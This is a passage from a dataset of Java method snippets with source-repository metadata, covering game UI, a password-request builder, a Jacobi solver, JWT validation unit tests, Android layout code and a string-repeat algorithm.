repaint();\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 58867, "method_name": "compareTo", "class_name": "RaceValue", "params": ["RaceValue"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int compareTo(RaceValue rv) {\n            return value > rv.value ? -1 : value < rv.value ? +1 : 0;\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/races/RacesStatusUI.java", "stars": "74", "class_props": {"extends": null, "implements": ["Comparable"], "modifiers": []}}, {"id": 58868, "method_name": "getApi", "class_name": "PasswordApi", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getApi() {\n        return \"user/password\";\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/PasswordApi.java", "stars": "1", "class_props": {"extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"id": 58869, "method_name": "setPhone", "class_name": "PasswordApi", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "PasswordApi", "snippet": "    public PasswordApi setPhone(String phone) {\n        this.phone = phone;\n        return this;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/PasswordApi.java", "stars": "1", "class_props": {"extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"id": 58870, "method_name": "setCode", "class_name": "PasswordApi", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "PasswordApi", "snippet": "    public PasswordApi setCode(String code) {\n        this.code = code;\n        return this;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/PasswordApi.java", "stars": "1", "class_props": {"extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"id": 58871, "method_name": "setPassword", "class_name": "PasswordApi", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "PasswordApi", "snippet": "    public PasswordApi setPassword(String password) {\n        this.password = password;\n        return this;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/PasswordApi.java", "stars": "1", "class_props": {"extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"id": 58872, "method_name": "transformToDominant", "class_name": "Jacobi", "params": ["int", "boolean", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean transformToDominant(int r, boolean[] visited, int[] rows) {\n        int matrixLength = matrix.length;\n\n        if (r == matrix.length) {\n            double[][] newMatrix = new double[matrixLength][matrixLength + 1];\n            for (int i = 0; i < rows.length; i++) {\n                if (matrixLength + 1 >= 0)\n                    System.arraycopy(matrix[rows[i]], 0, newMatrix[i], 0, matrixLength + 1);\n            }\n\n            matrix = newMatrix;\n            return true;\n        }\n\n        for (int y = 0; y < matrixLength; y++) {\n            if (visited[y])\n                continue;\n\n            double sum = 0;\n\n            for (int x = 0; x < matrixLength - 1; x++)\n                if (x != r)\n                    sum += Math.abs(matrix[y][x]);\n\n            if (Math.abs(matrix[y][r]) > sum) { // diagonally dominant?\n                visited[y] = true;\n                rows[r] = y;\n\n                if (transformToDominant(r + 1, visited, rows))\n                    return true;\n\n                visited[y] = false;\n            }\n        }\n\n        return false;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab2/master/src/main/java/com/demkom58/nmlab2/calculations/Jacobi.java", "stars": "2", "class_props": {"extends": null, "implements": ["EquationSystemSolver"], "modifiers": ["public"]}}, {"id": 58873, "method_name": "makeDominant", "class_name": "Jacobi", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean makeDominant() {\n        boolean[] visited = new boolean[matrix.length];\n        int[] rows = new int[matrix.length];\n\n        Arrays.fill(visited, false);\n\n        return transformToDominant(0, visited, rows);\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab2/master/src/main/java/com/demkom58/nmlab2/calculations/Jacobi.java", "stars": "2", "class_props": {"extends": null, "implements": ["EquationSystemSolver"], "modifiers": ["public"]}}, {"id": 58874, "method_name": "solve", "class_name": "Jacobi", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Answer", "snippet": "    public Answer solve() {\n        int iterations = 0;\n        int n = matrix.length;\n\n        double[] X = new double[n];\n        double[] P = new double[n];\n\n        Arrays.fill(X, 0);\n        Arrays.fill(P, 0);\n\n        final Answer answer;\n        final List<Answer.Iteration> iterationNodes = new ArrayList<>();\n\n        while (true) {\n            for (int i = 0; i < n; i++) {\n                double sum = matrix[i][n];\n\n                for (int j = 0; j < n; j++)\n                    if (j != i)\n                        sum -= matrix[i][j] * P[j];\n\n                X[i] = 1 / matrix[i][i] * sum;\n            }\n\n            var iterationValues = new double[n];\n            System.arraycopy(X, 0, iterationValues, 0, n);\n            iterationNodes.add(new Answer.Iteration(iterations, iterationValues));\n\n            iterations++;\n            if (iterations == 1)\n                continue;\n\n            boolean stop = true;\n            for (int i = 0; i < n; i++)\n                if (Math.abs(X[i] - P[i]) > epsilon) {\n                    stop = false;\n                    break;\n                }\n\n            if (stop || (iterations == maxIterations)) {\n                answer = new Answer(iterationNodes, !stop);\n                break;\n            }\n\n            P = X.clone();\n        }\n\n        return answer;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab2/master/src/main/java/com/demkom58/nmlab2/calculations/Jacobi.java", "stars": "2", "class_props": {"extends": null, "implements": ["EquationSystemSolver"], "modifiers": ["public"]}}, {"id": 58875, "method_name": "getMatrix", "class_name": "Jacobi", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double[][] getMatrix() {\n        return matrix;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab2/master/src/main/java/com/demkom58/nmlab2/calculations/Jacobi.java", "stars": "2", "class_props": {"extends": null, "implements": ["EquationSystemSolver"], "modifiers": ["public"]}}, {"id": 58876, "method_name": "getName", "class_name": "Jacobi", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return \"\u041c\u0435\u0442\u043e\u0434 \u043f\u0440\u043e\u0441\u0442\u0438\u0445 \u0456\u0442\u0435\u0440\u0430\u0446\u0456\u0439\";\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab2/master/src/main/java/com/demkom58/nmlab2/calculations/Jacobi.java", "stars": "2", "class_props": {"extends": null, "implements": ["EquationSystemSolver"], "modifiers": ["public"]}}, {"id": 58877, "method_name": "setup", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {\n        tokenProvider = new TokenProvider(new JHipsterProperties());\n        key = Keys.hmacShaKeyFor(Decoders.BASE64\n            .decode(\"fd54a45s65fds737b9aafcb3412e07ed99b267f33413274720ddbb7f6c5e64e9f14075f2d7ed041592f0b7657baf8\"));\n\n        ReflectionTestUtils.setField(tokenProvider, \"key\", key);\n        ReflectionTestUtils.setField(tokenProvider, \"tokenValidityInMilliseconds\", ONE_MINUTE);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58878, "method_name": "testReturnFalseWhenJWThasInvalidSignature", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testReturnFalseWhenJWThasInvalidSignature() {\n        boolean isTokenValid = tokenProvider.validateToken(createTokenWithDifferentSignature());\n\n        assertThat(isTokenValid).isEqualTo(false);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58879, "method_name": "testReturnFalseWhenJWTisMalformed", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testReturnFalseWhenJWTisMalformed() {\n        Authentication authentication = createAuthentication();\n        String token = tokenProvider.createToken(authentication, false);\n        String invalidToken = token.substring(1);\n        boolean isTokenValid = tokenProvider.validateToken(invalidToken);\n\n        assertThat(isTokenValid).isEqualTo(false);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58880, "method_name": "testReturnFalseWhenJWTisExpired", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testReturnFalseWhenJWTisExpired() {\n        ReflectionTestUtils.setField(tokenProvider, \"tokenValidityInMilliseconds\", -ONE_MINUTE);\n\n        Authentication authentication = createAuthentication();\n        String token = tokenProvider.createToken(authentication, false);\n\n        boolean isTokenValid = tokenProvider.validateToken(token);\n\n        assertThat(isTokenValid).isEqualTo(false);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58881, "method_name": "testReturnFalseWhenJWTisUnsupported", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testReturnFalseWhenJWTisUnsupported() {\n        String unsupportedToken = createUnsupportedToken();\n\n        boolean isTokenValid = tokenProvider.validateToken(unsupportedToken);\n\n        assertThat(isTokenValid).isEqualTo(false);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58882, "method_name": "testReturnFalseWhenJWTisInvalid", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testReturnFalseWhenJWTisInvalid() {\n        boolean isTokenValid = tokenProvider.validateToken(\"\");\n\n        assertThat(isTokenValid).isEqualTo(false);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58883, "method_name": "createAuthentication", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Authentication", "snippet": "    private Authentication createAuthentication() {\n        Collection<GrantedAuthority> authorities = new ArrayList<>();\n        authorities.add(new SimpleGrantedAuthority(AuthoritiesConstants.ANONYMOUS));\n        return new UsernamePasswordAuthenticationToken(\"anonymous\", \"anonymous\", authorities);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58884, "method_name": "createUnsupportedToken", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String createUnsupportedToken() {\n        return Jwts.builder()\n            .setPayload(\"payload\")\n            .signWith(key, SignatureAlgorithm.HS512)\n            .compact();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58885, "method_name": "createTokenWithDifferentSignature", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String createTokenWithDifferentSignature() {\n        Key otherKey = Keys.hmacShaKeyFor(Decoders.BASE64\n            .decode(\"Xfd54a45s65fds737b9aafcb3412e07ed99b267f33413274720ddbb7f6c5e64e9f14075f2d7ed041592f0b7657baf8\"));\n\n        return Jwts.builder()\n            .setSubject(\"anonymous\")\n            .signWith(otherKey, SignatureAlgorithm.HS512)\n            .setExpiration(new Date(new Date().getTime() + ONE_MINUTE))\n            .compact();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58886, "method_name": "getMaxLineWidth", "class_name": "HorizontalScroller", "params": ["TextView"], "throws": null, "modifiers": ["final", "static", "private"], "return_type": "int", "snippet": "    private static final int getMaxLineWidth(TextView textView) {\n        Layout layout = textView.getLayout();\n        if (layout != null) {\n            int lineCount = layout.getLineCount();\n            float max = 0;\n            for (int i = 0; i < lineCount; i++) {\n                float lineWidth = layout.getLineWidth(i);\n                max = Math.max(max, lineWidth);\n            }\n            return (int) max;\n        } else {\n            return 0;\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/htmlwidget/HorizontalScroller.java", "stars": "74", "class_props": {"extends": "HorizontalScrollView", "implements": null, "modifiers": ["public"]}}, {"id": 58887, "method_name": "measureChild", "class_name": "HorizontalScroller", "params": ["View", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void measureChild(View child, int parentWidthMeasureSpec, int parentHeightMeasureSpec) {\n        ViewGroup.LayoutParams lp = child.getLayoutParams();\n\n        int childWidthMeasureSpec = getChildMeasureSpec(parentWidthMeasureSpec, getPaddingLeft()\n                + getPaddingRight(), lp.width);\n        int childHeightMeasureSpec = getChildMeasureSpec(parentHeightMeasureSpec, getPaddingTop()\n                + getPaddingBottom(), lp.height);\n\n        child.measure(childWidthMeasureSpec, childHeightMeasureSpec);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/htmlwidget/HorizontalScroller.java", "stars": "74", "class_props": {"extends": "HorizontalScrollView", "implements": null, "modifiers": ["public"]}}, {"id": 58888, "method_name": "measureChildWithMargins", "class_name": "HorizontalScroller", "params": ["View", "int", "int", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void measureChildWithMargins(View child, int parentWidthMeasureSpec, int widthUsed,\n            int parentHeightMeasureSpec, int heightUsed) {\n        MarginLayoutParams lp = (MarginLayoutParams) child.getLayoutParams();\n\n        int childWidthMeasureSpec = getChildMeasureSpec(parentWidthMeasureSpec, getPaddingLeft()\n                + getPaddingRight() + lp.leftMargin + lp.rightMargin + widthUsed, lp.width);\n        int childHeightMeasureSpec = getChildMeasureSpec(parentHeightMeasureSpec, getPaddingTop()\n                + getPaddingBottom() + lp.topMargin + lp.bottomMargin + heightUsed, lp.height);\n\n        child.measure(childWidthMeasureSpec, childHeightMeasureSpec);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/htmlwidget/HorizontalScroller.java", "stars": "74", "class_props": {"extends": "HorizontalScrollView", "implements": null, "modifiers": ["public"]}}, {"id": 58889, "method_name": "onLayout", "class_name": "HorizontalScroller", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onLayout(boolean changed, int left, int top, int right, int bottom) {\n        super.onLayout(changed, left, top, right, bottom);\n\n        int count = getChildCount();\n        for (int i = 0; i < count; i++) {\n            View child = getChildAt(i);\n            int visibility = child.getVisibility();\n            if (visibility != GONE && child instanceof TextView) {\n                int childLeft = child.getLeft();\n                int childTop = child.getTop();\n                int childRight = child.getRight();\n                int childBottom = child.getBottom();\n\n                int padding = child.getPaddingLeft() + child.getPaddingRight();\n                int maxLineWidth = getMaxLineWidth((TextView) child);\n                int preferredRight = childLeft + maxLineWidth + padding;\n\n                if (childRight < preferredRight) {\n                    child.layout(childLeft, childTop, preferredRight, childBottom);\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/htmlwidget/HorizontalScroller.java", "stars": "74", "class_props": {"extends": "HorizontalScrollView", "implements": null, "modifiers": ["public"]}}, {"id": 58890, "method_name": "clone", "class_name": "MaximalRepeat", "params": ["Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void clone(Substring other) {\n\t\tsuper.clone(other);\n\t\tMaximalRepeat mr = (MaximalRepeat)other;\n\t\tmr.leftContext=leftContext;\n\t\tmr.isLeftExtensionOfMaximalRepeat=isLeftExtensionOfMaximalRepeat;\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/MaximalRepeat.java", "stars": "2", "class_props": {"extends": "RightMaximalSubstring", "implements": null, "modifiers": ["public"]}}, {"id": 58891, "method_name": "getInstance", "class_name": "MaximalRepeat", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Substring", "snippet": "\tprotected Substring getInstance() {\n\t\treturn new MaximalRepeat(alphabetLength,log2alphabetLength,bitsToEncodeAlphabetLength,bwtLength,log2BWTLength,bitsToEncodeBWTLength);\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/MaximalRepeat.java", "stars": "2", "class_props": {"extends": "RightMaximalSubstring", "implements": null, "modifiers": ["public"]}}, {"id": 58892, "method_name": "getEpsilon", "class_name": "MaximalRepeat", "params": ["long"], "throws": null, "modifiers": ["protected"], "return_type": "Substring", "snippet": "\tprotected Substring getEpsilon(long[] C) {\n\t\tMaximalRepeat out = (MaximalRepeat)getInstance();\n\n\t\t// $bwtIntervals$\n\t\tout.nIntervals=alphabetLength+1;\n\t\tout.bwtIntervals[0][0]=0;  // $#$\n\t\tout.bwtIntervals[0][1]=0;\n\t\tfor (int i=0; i<alphabetLength-1; i++) {  // Other characters\n\t\t\tout.bwtIntervals[i+1][0]=C[i];\n\t\t\tout.bwtIntervals[i+1][1]=C[i+1]-1;\n\t\t}\n\t\tout.bwtIntervals[alphabetLength][0]=C[alphabetLength-1];\n\t\tout.bwtIntervals[alphabetLength][1]=bwtLength-1;\n\n\t\t// Other variables\n\t\tout.address=-1;\n\t\tout.log2address=-1;\n\t\tout.previousAddress=-1;\n\t\tout.length=0;\n\t\tout.log2length=-1;\n\t\tout.bitsToEncodeLength=1;\n\t\tout.firstCharacter=-1;\n\t\tout.hasBeenExtended=false;\n\t\tout.hasBeenStolen=false;\n\t\tout.computeRightContext();\n\t\tout.leftContext=-1;\n\t\tout.isLeftExtensionOfMaximalRepeat=false;\n\n\t\treturn out;\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/MaximalRepeat.java", "stars": "2", "class_props": {"extends": "RightMaximalSubstring", "implements": null, "modifiers": ["public"]}}, {"id": 58893, "method_name": "toString", "class_name": "MaximalRepeat", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\tString out = super.toString()+\" | \";\n\t\tout+=\"leftContext=\"+leftContext+\" \";\n\t\tout+=\"isLeftExtensionOfMaximalRepeat=\"+isLeftExtensionOfMaximalRepeat+\" \";\n\t\treturn out;\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/MaximalRepeat.java", "stars": "2", "class_props": {"extends": "RightMaximalSubstring", "implements": null, "modifiers": ["public"]}}, {"id": 58894, "method_name": "computeLeftContext", "class_name": "MaximalRepeat", "params": ["Substring"], "throws": null, "modifiers": ["final", "protected"], "return_type": "void", "snippet": "\tprotected final void computeLeftContext(Substring[] leftExtensions) {\n\t\tleftContext=0;\n\t\tfor (int i=0; i<alphabetLength+1; i++) {\n\t\t\tif (leftExtensions[i].frequency()>0) leftContext++;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/MaximalRepeat.java", "stars": "2", "class_props": {"extends": "RightMaximalSubstring", "implements": null, "modifiers": ["public"]}}, {"id": 58895, "method_name": "visited", "class_name": "MaximalRepeat", "params": ["Stream", "RigidStream", "SimpleStream", "Substring", "Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void visited(Stream stack, RigidStream characterStack, SimpleStream pointerStack, Substring[] cache, Substring[] leftExtensions) {\n\t\tsuper.visited(stack,characterStack,pointerStack,cache,leftExtensions);\n\n\t\t// Maximal repeat\n\t\tcomputeLeftContext(leftExtensions);\n\n\t\t// Left-extensions of maximal repeats\n\t\tif (leftContext>1) {\n\t\t\tMaximalRepeat mr;\n\t\t\tfor (int i=1; i<alphabetLength+1; i++) {  // Disregarding $#$\n\t\t\t\tmr=(MaximalRepeat)leftExtensions[i];\n\t\t\t\tif (leftExtensions[i].frequency()>0) mr.isLeftExtensionOfMaximalRepeat=true;\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/MaximalRepeat.java", "stars": "2", "class_props": {"extends": "RightMaximalSubstring", "implements": null, "modifiers": ["public"]}}, {"id": 58896, "method_name": "init", "class_name": "HLRefreshLayout", "params": ["Context"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void init(Context context) {\n        // \u6dfb\u52a0\u4e00\u4e2aFooter\n        maxFooterH = DensityUtil.dip2px(context, 46);\n        lClassFooter = new LClassFooter(getContext());\n        // \u6dfb\u52a0\u4e00\u4e2aHeader\n        maxHeaderH = DensityUtil.dip2px(context, 46);\n        lClassHeader = new LClassHeader(getContext());\n\n        // Nothing use..\n        viewDragHelper = ViewDragHelper.create(this, 1.0f, new DraggableViewCallback(this));\n\n        // \u6dfb\u52a0\u5237\u65b0\u5934Header\n        if (null != lClassHeader.getParent() &&\n                lClassHeader.getParent() instanceof ViewGroup) {\n            ViewGroup parent = (ViewGroup) lClassHeader.getParent();\n            parent.removeView(lClassHeader);\n        }\n        addView(lClassHeader, LinearLayout.LayoutParams.MATCH_PARENT, maxHeaderH);\n\n        // \u6dfb\u52a0\u5e95\u90e8\u52a0\u8f7dFooter\n        if (null != lClassFooter.getParent() &&\n                lClassFooter.getParent() instanceof ViewGroup) {\n            ViewGroup parent = (ViewGroup) lClassFooter.getParent();\n            parent.removeView(lClassFooter);\n        }\n        addView(lClassFooter, LinearLayout.LayoutParams.MATCH_PARENT, maxFooterH);\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_refreshlayout/src/main/java/com/hl/lib_refreshlayout/view/HLRefreshLayout.java", "stars": "14", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 58897, "method_name": "dispatchTouchEvent", "class_name": "HLRefreshLayout", "params": ["MotionEvent"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean dispatchTouchEvent(MotionEvent ev) {\n        Log.e(\"HLRefreshLayout dTouch\", String.valueOf(ev.getAction()));\n\n        switch (ev.getAction()) {\n            case MotionEvent.ACTION_DOWN:\n                touchY1 = ev.getY();\n                touchX1 = ev.getX();\n                break;\n            case MotionEvent.ACTION_MOVE:\n                diffY = touchY1 - ev.getY();\n                diffX = ev.getX() - touchX1;\n                touchY1 = ev.getY();\n                touchX1 = ev.getX();\n\n                // \u5411\u4e0b\u6eda\u52a8\n                if (diffY <= 0) {\n                    // \u6b64\u65f6\u5982\u679c\u662f\u52a0\u8f7d\u4e2d\u7684\u72b6\u6001\uff0c\u5219\u4e0d\u80fd\u89e6\u53d1\u4e0b\u62c9\u6536\u56de\u7684\u64cd\u4f5c\n                    if (load_state != State.LOADING ||\n                            load_state == State.NOMORE_DATA) {\n                        footerH -= Math.abs(diffY) / 3;\n                        if (footerH <= 0) {\n                            footerH = 0;\n                        }\n                        lClassFooter.onStart();\n                        requestLayout();\n                    }\n\n                    // Rv\u4e0d\u80fd\u5411\u4e0b\u6ed1\u52a8\u4e86\n                    if (!recyclerView.canScrollVertically(-1) &&\n                            (load_state != State.LOADING)) {\n                        headerH += Math.abs(diffY) / 3;\n                        if (headerH > maxHeaderH) {\n                            headerH = maxHeaderH;\n                        }\n                        load_state = State.START_REFRESH;\n                        lClassHeader.onStart();\n                        requestLayout();\n                    }\n                } else { // \u5411\u4e0a\u6eda\u52a8\n                    Log.e(\"test\", \"-1-1-1\");\n                    if (load_state != State.REFRESHING) {\n                        Log.e(\"test\", \"0000\");\n                        headerH -= diffY / 3;\n                        if (headerH <= 0) {\n                            headerH = 0;\n                        }\n                        requestLayout();\n                    }\n\n                    // \u663e\u793a\u52a0\u8f7d\u66f4\u591a\u7684\u60c5\u51b5\uff0c\u6b64\u65f6\u4e0d\u8fdb\u884c\u52a0\u8f7d\u66f4\u591a\u56de\u8c03\uff1b\u5373\u4e0d\u6539\u53d8\u72b6\u6001\n                    if (!recyclerView.canScrollVertically(1) &&\n                            load_state == State.NOMORE_DATA) {\n                        Log.e(\"test\", \"1111\");\n                        footerH += diffY / 3;\n                        if (footerH > maxFooterH) {\n                            footerH = maxFooterH;\n                        }\n                        lClassFooter.onStart();\n                        requestLayout();\n                    } else if (!recyclerView.canScrollVertically(1) && // Rv\u4e0d\u80fd\u5411\u4e0a\u6ed1\u52a8\u4e86\uff0c\u6b64\u65f6\u7ee7\u7eed\u4e0a\u62c9\n                            (load_state != State.REFRESHING)) {\n                        Log.e(\"test\", \"2222\");\n                        footerH += diffY / 3;\n                        if (footerH > maxFooterH) {\n                            footerH = maxFooterH;\n                        }\n                        load_state = State.START_LOAD;\n                        lClassFooter.onStart();\n                        requestLayout();\n                    }\n                }\n                break;\n            case MotionEvent.ACTION_CANCEL:\n            case MotionEvent.ACTION_UP:\n                Log.e(\"test\", \"4444 \" + load_state);\n                if (load_state == State.START_LOAD) {\n                    // \u5982\u679c\u6ca1\u6709\u4e0a\u62c9\u5230\u4e00\u5b9a\u8ddd\u79bb\uff0c\u5219\u4e0d\u89e6\u53d1\u52a0\u8f7d\u66f4\u591a\n                    if (footerH < (maxFooterH * 3 / 4)) {\n                        // \u4e0d\u89e6\u53d1\u52a0\u8f7d\u66f4\u591a\uff0c\u6b64\u65f6\u4e0d\u662f\u52a0\u8f7d\u4e2d\u7684\u72b6\u6001\n                        load_state = State.NONE;\n                        lClassFooter.onFinish();\n                        // \u6b64\u65f6Recycleview\u8fd8\u6709\u6709\u70b9\u6ca1\u6709\u7f6e\u5e95\uff0c\u6211\u4eec\u6eda\u52a8\u4e00\u4e0b\n                        recyclerView.scrollToPosition(recyclerView.getAdapter().getItemCount() - 1);\n                        footerH = 0;\n                    } else {\n                        // \u5982\u679c\u8fbe\u52303/4\uff0c\u5219\u5168\u90e8\u5c55\u5f00\n                        footerH = maxFooterH;\n                        // \u6b64\u65f6Recycleview\u8fd8\u6709\u6709\u70b9\u6ca1\u6709\u7f6e\u5e95\uff0c\u6211\u4eec\u6eda\u52a8\u4e00\u4e0b\n                        recyclerView.scrollToPosition(recyclerView.getAdapter().getItemCount() - 1);\n                        // \u8fbe\u5230\u4e00\u5b9a\u8ddd\u79bb\uff0c\u5f00\u59cb\u8fdb\u884c\u52a0\u8f7d\u4e2d\u663e\u793a\uff1b\n                        // \u6b64\u65f6\u4fdd\u6301\u5728\u5e95\u90e8\uff0c\u9664\u975e\u8c03\u7528finishLoadMore\u65b9\u6cd5\n                        // \u7981\u6b62Recycleview\u6eda\u52a8\n                        //customLinearLayoutManager.setScrollEnabled(false);\n                        // \u8bbe\u7f6e\u5904\u4e8e\u52a0\u8f7d\u4e2d\u7684\u72b6\u6001\n                        load_state = State.LOADING;\n                        lClassFooter.setLoadData();\n                        if (null != refreshListenner) {\n                            refreshListenner.OnLoadMore();\n                        }\n                    }\n                } else if (load_state == State.START_REFRESH) {\n                    // \u5982\u679c\u6ca1\u6709\u4e0b\u62c9\u4e0d\u5230\u4e00\u5b9a\u8ddd\u79bb\uff0c\u5219\u4e0d\u89e6\u53d1\u5237\u65b0\n                    if (headerH < (maxHeaderH * 3 / 4)) {\n                        // \u4e0d\u89e6\u53d1\u52a0\u8f7d\u66f4\u591a\uff0c\u6b64\u65f6\u4e0d\u662f\u52a0\u8f7d\u4e2d\u7684\u72b6\u6001\n                        load_state = State.NONE;\n                        lClassHeader.onFinish();\n                        headerH = 0;\n                    } else {\n                        // \u5982\u679c\u8fbe\u52303/4\uff0c\u5219\u5168\u90e8\u5c55\u5f00\n                        headerH = maxHeaderH;\n                        // \u6b64\u65f6Recycleview\u8fd8\u6709\u6709\u70b9\u6ca1\u6709\u7f6e\u9876\uff0c\u6211\u4eec\u6eda\u52a8\u4e00\u4e0b\n                        //recyclerView.scrollToPosition(0);\n                        // \u8fbe\u5230\u4e00\u5b9a\u8ddd\u79bb\uff0c\u5f00\u59cb\u8fdb\u884c\u52a0\u8f7d\u4e2d\u663e\u793a\uff1b\n                        // \u6b64\u65f6\u4fdd\u6301\u5728\u5e95\u90e8\uff0c\u9664\u975e\u8c03\u7528finishLoadMore\u65b9\u6cd5\n                        // \u7981\u6b62Recycleview\u6eda\u52a8\n                        //customLinearLayoutManager.setScrollEnabled(false);\n                        // \u8bbe\u7f6e\u5904\u4e8e\u52a0\u8f7d\u4e2d\u7684\u72b6\u6001\n                        load_state = State.REFRESHING;\n                        lClassHeader.setFreshData();\n                        if (null != refreshListenner) {\n                            refreshListenner.OnRefresh();\n                        }\n                    }\n                } else if (load_state == State.NOMORE_DATA){\n                    // \u5982\u679c\u6ca1\u6709\u4e0a\u62c9\u5230\u4e00\u5b9a\u8ddd\u79bb\uff0c\u5219\u4e0d\u89e6\u53d1\u52a0\u8f7d\u66f4\u591a\n                    if (footerH < (maxFooterH * 3 / 4)) {\n                        lClassFooter.onFinish();\n                        footerH = 0;\n                    } else {\n                        // 